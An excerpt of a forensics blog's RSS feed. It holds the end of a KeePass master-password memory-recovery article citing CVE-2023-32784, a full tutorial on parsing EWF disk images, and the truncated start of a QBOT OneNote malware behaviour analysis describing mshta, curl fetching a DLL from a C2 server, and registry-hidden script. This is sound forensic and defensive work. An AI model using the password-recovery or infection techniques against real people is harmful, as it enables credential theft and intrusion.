class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Even if the first character of the password is not store in memory, the latter can be however easily brute forced.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/keepass#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>To conclude this article, we demonstrated that the reconstruction of a master password of Keepass can be implemented into volatility3 framework via a custom plugin. The discovery of new memory extraction techniques is helping the field of digital forensics and specially law enforcement agencies that are now able to access memory from devices in a more efficient and non-destructive way. This methodology could be valuable in solving actual incident cases, including past ones where the memory was retrieved and stored and keepass master password remained unbroke.</p>
<blockquote>
<p>This plugin was tested on a Win10 22H2 memory image. Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article.</p>
</blockquote>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/keepass#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-8d99df">
<p><a href="https://sourceforge.net/u/v2023/profile/" target="_blank" rel="noopener noreferrer">https://sourceforge.net/u/v2023/profile/</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-1-8d99df" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-8d99df">
<p><a href="https://sourceforge.net/p/keepass/discussion/329220/thread/f3438e6283/" target="_blank" rel="noopener noreferrer">https://sourceforge.net/p/keepass/discussion/329220/thread/f3438e6283/</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-2-8d99df" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-8d99df">
<p><a href="https://github.com/vdohney/keepass-password-dumper" target="_blank" rel="noopener noreferrer">https://github.com/vdohney/keepass-password-dumper</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-3-8d99df" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-3-8d99df-2" data-footnote-backref="" aria-label="Back to reference 3-2" class="data-footnote-backref">‚Ü©<sup>2</sup></a></p>
</li>
<li id="user-content-fn-4-8d99df">
<p><a href="https://github.com/CMEPW/keepass-dump-masterkey" target="_blank" rel="noopener noreferrer">https://github.com/CMEPW/keepass-dump-masterkey</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-4-8d99df" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-5-8d99df">
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784" target="_blank" rel="noopener noreferrer">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784</a> <a href="https://forensicxlab.github.io/blog/keepass#user-content-fnref-5-8d99df" data-footnote-backref="" aria-label="Back to reference 5" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Memory Forensics</category>
            <category>KeePass</category>
            <category>Windows</category>
        </item>
        <item>
            <title><![CDATA[üî¶ Debunking the Expert Witness Compression Format (EWF)]]></title>
            <link>https://forensicxlab.github.io/blog/ewf</link>
            <guid>https://forensicxlab.github.io/blog/ewf</guid>
            <pubDate>Thu, 11 May 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[As a digital forensic expert, proving the authenticity and reliability of a forensic image in court is essential. Indeed, the integrity of the data needs to be maintained during the imaging process, preventing any accidental or intentional modification of the data.]]></description>
            <content:encoded><![CDATA[<p>As a digital forensic expert, proving the authenticity and reliability of a forensic image in court is essential. Indeed, the integrity of the data needs to be maintained during the imaging process, preventing any accidental or intentional modification of the data.
The Expert Witness Compression Format (EWF) provides a way to store metadata about the image, such as the source device, imaging tool, checksums, signatures, and other relevant information about the acquired media. This imaging format main feature is its compression capability thus reducing the size of the resulting image file. Compression allows for faster analysis of the data and reduces storage requirements.
This article is meant to vulgarize the structures behind an EWF Segment. The reader will discover the main algorithms to use in order to be able to read and seek inside such image format. Finally, a proof of concept writen in rust will be shared to the reader.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="filesystem-layers-of-abstraction">Filesystem layers of abstraction<a href="https://forensicxlab.github.io/blog/ewf#filesystem-layers-of-abstraction" class="hash-link" aria-label="Direct link to Filesystem layers of abstraction" title="Direct link to Filesystem layers of abstraction">‚Äã</a></h2>
<p>Before getting right into the main subject of this article, it is important to learn or get a little reminder about the filesystem concepts, vocabulary, and the underlying layers of abstractions.
Let us take the Unix filesystem concept as an example. Below is a vulgarized representation of the main layers of abstraction.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-7a939b608e6c8f0b9b010d3f93415301.png" title="Filesystem layout" width="1198" height="721" class="img_ev3q"></p>
<p>A storage medium (hard drive, SSD, ‚Ä¶) have the necessary set of electronics to create an abstraction of the Logical Block Addressing. It can be viewed as contiguous sequence of sectors. A sector is the smallest accessible unit on a drive (typically 512 bytes for disk drives).  It is possible to create a group multiple sectors and form a block.  Blocks are the smallest accessible units on a filesystem.  Each filesystem type can have their own concepts to represents files, directories, hardware devices etc...
The exploitation system is supplying the abstraction of those human friendly concepts via the kernel to perform various actions on the filesystem (read, write, seek...).</p>
<p>Digital forensics is performed on a copy of the media to be investigated. This can be done with various tools (FTK Imager, EnCase, dd, Falcon, others‚Ä¶) and produce an image that can have various format (raw, img, ewf, vmdk, vdi‚Ä¶) to be analyzed later without performing the investigation on the original media.</p>
<p>From a forensics perspective, when a storage media is acquired, the investigator needs to find a way to emulate all the necessary abstraction layers in order to extract specific artifacts usefull to an investigation without tempering with the data. Forensics tools are providing such abstraction and capabilities. Most of those tools support different image format. One of these formats is well known and largely used: the Expert Witness Compressing Format (EWF).</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/2-f5aa868db1de4b2b4395bdc65c95f35b.png" title="Filesystem abstraction" width="1878" height="1338" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-expert-witness-compression-format">The Expert Witness Compression Format<a href="https://forensicxlab.github.io/blog/ewf#the-expert-witness-compression-format" class="hash-link" aria-label="Direct link to The Expert Witness Compression Format" title="Direct link to The Expert Witness Compression Format">‚Äã</a></h2>
<p>The Expert Witness Compression Format (EWF) is a forensic image output format created by the ASRDATA company. It can be used to create a bit-by-bit copy of a digital device. It includes both data and metadata, such as the partition table and other information about the device. EWF is designed to maintain the integrity of the original data and can be compressed to reduce storage requirements. It is widely used to preserve evidence for analysis and investigation both by law enforcement, digital forensics and incident response companies. This format is not so easy to understand because it is a proprietary file format, thus the purpose of this blog article. Luckily, the opensource community provide a C library and a nice documentation about this file format <sup><a href="https://forensicxlab.github.io/blog/ewf#user-content-fn-1-ff8942" id="user-content-fnref-1-ff8942" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>. Let‚Äôs try to have a nice mental representation of the components of an EWF image.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-segments">The segments<a href="https://forensicxlab.github.io/blog/ewf#the-segments" class="hash-link" aria-label="Direct link to The segments" title="Direct link to The segments">‚Äã</a></h3>
<p>An EWF image can be divided into multiple segment files (there can also be a unique segment file). Those segments files have a consecutive extension system: Starting from ‚ÄúE01‚Äù to ‚ÄúE99‚Äù, then in alphabetical order from ‚ÄúEAA‚Äù to ‚ÄúZZZ‚Äù. Dividing a large sized media evidence source into multiple segments is a great way to prevent a large and unique raw output file that can sometime creates problems on some filesystem. Each segment file is composed of a <strong>Header</strong> and multiple <strong>Sections</strong>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="the-ewf-file-header-and-sections">The EWF file Header and Sections<a href="https://forensicxlab.github.io/blog/ewf#the-ewf-file-header-and-sections" class="hash-link" aria-label="Direct link to The EWF file Header and Sections" title="Direct link to The EWF file Header and Sections">‚Äã</a></h4>
<p>Let‚Äôs now dive into the components of a EWF segment file.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-a08894ef23d4821517f6987ecdfe9c8f.png" title="EWF structure" width="1490" height="843" class="img_ev3q"></p>
<p>The EWF is storing the source evidence image‚Äôs sectors inside <strong>chunks</strong>. A chunk is just a group of sectors. There is a finite number of chunks per segments. Therefore, the information about the sectors and chunks needs to be known if we want to read them.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="the-segment-file-header">The segment file Header<a href="https://forensicxlab.github.io/blog/ewf#the-segment-file-header" class="hash-link" aria-label="Direct link to The segment file Header" title="Direct link to The segment file Header">‚Äã</a></h4>
<p>Each segment file has a <strong>Header</strong> (do not confuse the <strong>segment file header</strong> with the <strong>section header</strong> described later). The file header contains a signature (or a magic number) of 8 bytes that attest of its format:</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/4-8f3978b8f737aaa54a501a75624be5a3.png" title="Header" width="1108" height="636" class="img_ev3q"></p>
<p>In this example, the signature is: ‚ÄúEVF\0x09\0x0d\0x0a\0xff\0x00‚Äù</p>
<p>The file header also contains the information about the <strong>first section offset</strong> and the segment number.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="the-sections">The sections<a href="https://forensicxlab.github.io/blog/ewf#the-sections" class="hash-link" aria-label="Direct link to The sections" title="Direct link to The sections">‚Äã</a></h4>
<p>The sections are the metadata of the image used by the tools to be able to read the evidence sectors and get other various information about the acquired evidence (checksums, acquisition tool used, timestamps etc‚Ä¶). Each section starts with metadata describing itself:</p>
<ul>
<li>Its type (header, volume, ‚Ä¶)</li>
<li>Its size</li>
<li>The next section offset</li>
</ul>
<p>Here is what important information you can extract from each section:</p>
<ul>
<li><strong>The header section -</strong> Not to be confused with the segment file header described earlier, it contains information about the acquired media (case number, Evidence Number, Examiner name, etc.). Each acquisition tools have their own way of describing what information reside in this section.</li>
<li><strong>The ‚Äúvolume‚Äù or ‚Äúdisk‚Äù section ‚Äì</strong> It contains critical information about the sectors and the chunks of the acquired media that will help the investigator to parse the EWF file like the chunk count, the size of a chunk, the size of a sector, the number of sectors per chunk.</li>
<li><strong>The sector section ‚Äì</strong> It contains the actual chunks of the acquired evidence. Now, the main advantage about EWF is that some of the chunks can be compressed to gain space on the destination storage using the zlib compression algorithm. Therefore, we need to know what the offsets of each chunk are and if it is compressed chunk or not.</li>
<li><strong>The table section ‚Äì</strong> This section is like a table of pointers that will tell the investigator where to find each chunk and if it is compressed. The most significant bit (MSB) of each pointer indicates if the chunk is compressed (1) or uncompressed (0).</li>
<li><strong>The ‚Äúend‚Äù or ‚Äúnext‚Äù section ‚Äì</strong> The ‚Äúend‚Äú section indicates that this segment file was the last one. However, the ‚Äúnext‚Äù section indicates that there is another segment to parse.</li>
</ul>
<p>You can now understand better the image showed at the beginning. To have more details about each section, the libewf project is providing a good documentation <sup><a href="https://forensicxlab.github.io/blog/ewf#user-content-fn-2-ff8942" id="user-content-fnref-2-ff8942" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="parsing-the-ewf-segments">Parsing the EWF Segments<a href="https://forensicxlab.github.io/blog/ewf#parsing-the-ewf-segments" class="hash-link" aria-label="Direct link to Parsing the EWF Segments" title="Direct link to Parsing the EWF Segments">‚Äã</a></h3>
<p>Now that you have a better understanding of this file format, you want to be able to write a code to create the abstraction layer needed to read data like a standard disk and beginning the extraction of evidence.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="step-1-parsing-all-the-useful-metadata-from-each-segment">Step 1: Parsing all the useful metadata from each segment.<a href="https://forensicxlab.github.io/blog/ewf#step-1-parsing-all-the-useful-metadata-from-each-segment" class="hash-link" aria-label="Direct link to Step 1: Parsing all the useful metadata from each segment." title="Direct link to Step 1: Parsing all the useful metadata from each segment.">‚Äã</a></h4>
<p>First, we want to be able to read chunks, we first need to extract all the necessary metadata about those chunks from each segment. To hold all the important metadata, we can create multiple structures to store them. Here is an example of what you can do.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/5-92d8558c343bb21817ff54253852bcf9.png" title="EWF structure" width="1421" height="896" class="img_ev3q"></p>
<p>Here, the purple color corresponds to a Structure or an Object. The red color represents an HashMap or a Dictionary with a key and a value. The blue color is a vector. You‚Äôll notice that we have created the structures representing the different headers and sections of an EWF Segment. Our main goal is:</p>
<ul>
<li>To know where all the segment file descriptors are. (segments)</li>
<li>To store all the chunk for each segment (chunks).</li>
<li>To store all the end of sector offset for each segment (end_of_sectors).</li>
<li>To know what is the current chunk that the EWF structure points to (CachedChunk).
To understand better here are the structure definitions of a Chunk and a CachedChunk:</li>
</ul>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/6-454e2ad92c136e89a30f63e22005df0b.png" title="Chunk structure" width="1094" height="686" class="img_ev3q"></p>
<p>To parse a segment here is a pseudo-code algorithm:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Algorithm: parse_segment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parameters: self: The EWF Structure, file: the current segment.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Return value: EwfSegment filled with all the information about the chunks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Begin:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		// Parsing EWF Header</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self.ewf_header &lt;- new EwfHeader(file)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    current_offset &lt;- 0xd // We place our self just after the EWFHeader.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ewf_section_descriptor_size &lt;- 0x4c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    extracted_chunks &lt;- []</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    begin loop:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Parsing EWF section descriptor</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        section &lt;- new EwfSectionDescriptor(file, current_offset)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        section_offset &lt;- section.next_section_offset</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        section_size &lt;- section.section_size</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        section_type &lt;- section.section_type_def</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self.sections.push(section) // Save the section into a vector</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Saving header information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if section_type == "header" or section_type == "header2":</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self.header &lt;- new EwfHeaderSection(file, current_offset+ewf_section_descriptor_size, self.sections.last())</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Saving volume information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if section_type == "disk" or section_type == "volume":</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self.volume &lt;- new EwfVolumeSection(file, current_offset+ewf_section_descriptor_size)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Extracting chunks from table section</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if section_type == "table":</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            extracted_chunks.extend(self.parse_table(&amp;file, current_offset+ewf_section_descriptor_size)) //We save our chunks structure.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Saving end of sectors information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if section_type == "sectors":</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self.end_of_sectors.insert(self.ewf_header.segment_number, current_offset + section_size)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Checking if the current section is done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if current_offset == section_offset or section_type == "done":</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            break</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        // Updating the offset to go throught the segment file.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        current_offset &lt;- section_offset</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    end loop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    // Saving segment and extracted chunks information</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self.segments.push(file)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    self.chunks.insert(self.ewf_header.segment_number, extracted_chunks)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return self</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">End</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Notice that this function is calling other parsing functions and data structures that I did not describe in pseudo-code. The main goal is to understand the main parsing routine.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="step-2-read-an-arbitrary-chunk">Step 2: Read an arbitrary chunk.<a href="https://forensicxlab.github.io/blog/ewf#step-2-read-an-arbitrary-chunk" class="hash-link" aria-label="Direct link to Step 2: Read an arbitrary chunk." title="Direct link to Step 2: Read an arbitrary chunk.">‚Äã</a></h4>
<p>Now that we have save all our chunks, we can create a function to read the chunk number <strong>X</strong> from the given segment number <strong>Y</strong>.</p>
<p>Reading a chunk includes checking if it is a compressed chunk. And if so, decompressing its data before.</p>
<ol>
<li>To read the data from a chunk number in a segment file here are the steps to follow :</li>
<li>Check if the given chunk number is valid for the given segment using the ‚Äúchunks‚Äù dictionary in our EWF structure. If not, it raises an error.</li>
<li>Use the following variables:</li>
</ol>
<ul>
<li>data: An empty buffer of bytes to store the read data.</li>
<li>chunk: A reference to the chunk object in the segment.</li>
<li>start_offset: The starting position in the segment where the chunk data is located.</li>
<li>end_offset: The ending position in the segment where the chunk data is located (for compressed chunks).</li>
</ul>
<ol start="4">
<li>Seek to the starting position of the chunk data in the segment.</li>
<li>If the chunk is not compressed, read data from the segment into a buffer.</li>
<li>If the chunk is compressed, decode the compressed data using Zlib <sup><a href="https://forensicxlab.github.io/blog/ewf#user-content-fn-4-ff8942" id="user-content-fnref-4-ff8942" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> and store the result in the data buffer.</li>
<li>Return the data buffer containing the chunk data.</li>
</ol>
<p>We can now read the data from any chunk number in a given segment!</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="step-3-create-a-standard-read">Step 3: Create a standard read<a href="https://forensicxlab.github.io/blog/ewf#step-3-create-a-standard-read" class="hash-link" aria-label="Direct link to Step 3: Create a standard read" title="Direct link to Step 3: Create a standard read">‚Äã</a></h4>
<p>Now the last step is to create a read function to imitate the traditional read system call <sup><a href="https://forensicxlab.github.io/blog/ewf#user-content-fn-3-ff8942" id="user-content-fnref-3-ff8942" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup> on a POSIX system. To perform this task here are the steps for a given number of bytes to read:</p>
<ol>
<li>Check if there is any cached chunk data available. If not, read the first chunk of the first segment and set it as the cached chunk data.</li>
<li>Loop until the size is zero.</li>
<li>If the remaining size of the data to be read is less than or equal to the remaining data in the cached chunk, update the buffer with the remaining data. Then update the cached chunk pointer and size.</li>
<li>If the remaining size is greater than the remaining cached chunk data, update the buffer with all the remaining cached chunk data and calculate the remaining size of the data to be read.</li>
<li>Check if there are more chunks to be read or if the end of the segments has been reached. If there are more chunks, get the next chunk number and read that chunk's data.</li>
<li>Otherwise, return the buffer that has been read so far (nothing more to read).</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="proof-of-concept">Proof of concept<a href="https://forensicxlab.github.io/blog/ewf#proof-of-concept" class="hash-link" aria-label="Direct link to Proof of concept" title="Direct link to Proof of concept">‚Äã</a></h2>
<p>Now that we have finished the theorical part, I am sharing to you a proof of concept written in rust. The code can be found here: <a href="https://github.com/forensicxlab/EWF" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/EWF</a></p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/8-195c0769fda1a529bb0a81405c89676a.png" title="POC" width="1034" height="464" class="img_ev3q"></p>
<p>This code will show you all the important metadata about the parsed segments. It is capable of:</p>
<ul>
<li>Reading and seeking through the sectors of an EWF image.</li>
<li>Parsing the MBR.</li>
<li>Calculate the original media signature (MD5 of all the sectors).</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/ewf#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>To conclude this blogpost, we were able to create the abstraction layer needed to read an EWF image. We can now identify partitions and create other abstraction layer to read files, reconstruct a system tree etc‚Ä¶ This can be the subject of future blogposts. Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to make this article better.</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/ewf#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-ff8942">
<p><a href="https://github.com/libyal/libewf/blob/main/documentation/Expert%20Witness%20Compression%20Format%20(EWF).asciidoc" target="_blank" rel="noopener noreferrer">https://github.com/libyal/libewf/blob/main/documentation/Expert%20Witness%20Compression%20Format%20(EWF).asciidoc</a> <a href="https://forensicxlab.github.io/blog/ewf#user-content-fnref-1-ff8942" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-ff8942">
<p><a href="https://github.com/libyal/libewf" target="_blank" rel="noopener noreferrer">https://github.com/libyal/libewf</a> <a href="https://forensicxlab.github.io/blog/ewf#user-content-fnref-2-ff8942" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-4-ff8942">
<p><a href="https://www.zlib.net/" target="_blank" rel="noopener noreferrer">https://www.zlib.net/</a> <a href="https://forensicxlab.github.io/blog/ewf#user-content-fnref-4-ff8942" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-ff8942">
<p><a href="https://en.wikipedia.org/wiki/Read_(system_call)" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Read_(system_call)</a> <a href="https://forensicxlab.github.io/blog/ewf#user-content-fnref-3-ff8942" data-footnote-backref="" aria-label="Back to reference 4" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>EWF</category>
            <category>Digital Forensics</category>
        </item>
        <item>
            <title><![CDATA[üß¨ Malware Analysis with VISION-ProcMon]]></title>
            <link>https://forensicxlab.github.io/blog/vision</link>
            <guid>https://forensicxlab.github.io/blog/vision</guid>
            <pubDate>Mon, 27 Feb 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Malware analysis is very useful when performing a digital investigation. Indeed, identifying how a malware works and determining its behavior is very useful to detect future attacks, other compromised equipment, make critical choices and discover new TTPs. In this blog article, we will dive into the behavioral analysis of the latest QBOT campaign using malicious OneNote documents as an initial vector to compromise a host and deploy stealers. This article will demonstrate a use case of VISION-ProcMon for behavioral analysis.]]></description>
            <content:encoded><![CDATA[<p>Malware analysis is very useful when performing a digital investigation. Indeed, identifying how a malware works and determining its behavior is very useful to detect future attacks, other compromised equipment, make critical choices and discover new TTPs. In this blog article, we will dive into the behavioral analysis of the latest QBOT campaign using malicious OneNote documents as an initial vector to compromise a host and deploy stealers. This article will demonstrate a use case of VISION-ProcMon for behavioral analysis.</p>
<p><strong>Note:</strong> This blog post is not a complete analysis of the sample but simply demonstrate the capabilities of the tool.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="behavioral-analysis-using-vision-procmon">Behavioral analysis using VISION-ProcMon<a href="https://forensicxlab.github.io/blog/vision#behavioral-analysis-using-vision-procmon" class="hash-link" aria-label="Direct link to Behavioral analysis using VISION-ProcMon" title="Direct link to Behavioral analysis using VISION-ProcMon">‚Äã</a></h2>
<p>For this example, we are performing the analysis of a malicious OneNote document extracted from a phishing email linked to one of the latest QBOT campaign in February 2023. When performing the behavioral analysis of this malicious document, the analyst is usually setting up a lab with tools to record the activities of the system while the malicious activities are performed to analyze them latter. Using the Procmon tool from the Microsoft‚Äôs sysinternals, we can capture all the activities of processes running on the victim machine on demand.</p>
<p>If we launch the capture and execute the malicious OneNote document, we will have the details about the processes involved in the infection. When saving the result, we can choose to save the result as a CSV document.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/7-563e579662c64d056c29dc72bbc191b1.PNG" title="Vision filtered" width="1802" height="1043" class="img_ev3q"></p>
<p>Once our export has been made, we can launch VISION-ProcMon and enter the full path of the file to load.
<img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-fa69c30afab316e19fd06d43d2dddafa.png" title="Vision main menu" width="1786" height="1028" class="img_ev3q"></p>
<p>Once our export has been made, we can launch VISION-ProcMon and enter the full path of the file to load.
<img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/2-cf6e116c7190154a129b456107ca62ea.png" title="Vision filtered" width="3434" height="2086" class="img_ev3q"></p>
<p>We can see that the <strong>ONENOTE</strong> process launched the mshta.exe process which is a legitimate Microsoft process used to execute web content outside of a web browser. It can be used to execute JavaScript, VBScripts and other compatible web technologies. In this case we can see that following this process execution, two new processes are created: curl.exe and rundll32.exe which is very suspicious. Before pivoting to those processes, we can check what are the files and registry keys the mshta.exe process interacted with.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/5-93042d81c1a8f4d7ff1c6494539347eb.png" title="Vision filtered" width="1387" height="907" class="img_ev3q"></p>
<p>First, we can see that the process read the <strong>Open.hta</strong> file which is in the context of this malware analysis is the malicious HTA executed.</p>
<p>Next, we can witness the creation of the malicious registry key <strong>MP3Conv</strong>. Then the <strong>MP3Conv\Cfg</strong> value is set. In the context of the malware analysis, the malicious HTA is saving an encoded javascript function inside this registry key which is then executed. We can also see that the configuration is later deleted to clear tracks.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/9-8fab180c775fecf0faa9502937cc17bf.png" title="Vision filtered" width="1448" height="1008" class="img_ev3q"></p>
<p>Let‚Äôs pivot to the curl.exe process which is the next step after executing the malicious script. The command line associated is interesting because it contains the command used to fetch a malicious DLL on a C2 server disguised as an image.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-23cc2ae45db4b3e393c57dd23eb01643.png" title="Vision filtered" width="1381" height="847" class="img_ev3q"></p>
